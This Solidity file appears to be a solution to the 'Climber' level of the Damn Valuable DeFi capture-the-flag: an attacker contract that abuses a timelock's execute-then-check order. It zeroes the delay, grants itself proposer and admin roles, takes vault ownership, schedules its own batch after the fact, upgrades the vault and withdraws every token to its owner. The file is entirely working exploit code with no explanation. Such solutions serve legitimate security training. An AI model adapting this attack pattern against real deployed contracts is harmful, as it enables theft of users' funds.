// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";
import '../../climber/ClimberVault.sol';
import '../../climber/ClimberTimelock.sol';
import './ClimberVaultV2.sol';

contract ClimberAttacker {
    DamnValuableToken private immutable dvt;
    ClimberVault private immutable vault;
    ClimberTimelock private immutable timelock;

    address private immutable owner;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;

    bytes32 private salt;

    constructor(address _dvt, address _vault, address _timelock) {
        dvt = DamnValuableToken(_dvt);
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(payable(_timelock));

        owner = msg.sender;
    }

    function exploit() external {
        require(msg.sender == owner, "nope");

        targets = new address[](5);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(timelock);
        targets[3] = address(vault);
        targets[4] = address(this);

        values = new uint256[](5);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;

        dataElements = new bytes[](5);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", timelock.PROPOSER_ROLE(), address(this));
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", timelock.ADMIN_ROLE(), address(this));
        dataElements[3] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        dataElements[4] = abi.encodeWithSignature("stage2()");

        salt = keccak256("yakuhito");

        timelock.execute(targets, values, dataElements, salt);
    }

    function stage2() external {
        require(msg.sender == address(timelock), "nope");
        require(timelock.hasRole(timelock.PROPOSER_ROLE(), address(this)), "no role ser");

        timelock.schedule(targets, values, dataElements, salt);
        ClimberVaultV2 newVault = new ClimberVaultV2();
        vault.upgradeTo(address(newVault));
        vault.withdraw(address(dvt), owner, dvt.balanceOf(address(vault)));
    }

    fallback() external payable {}
}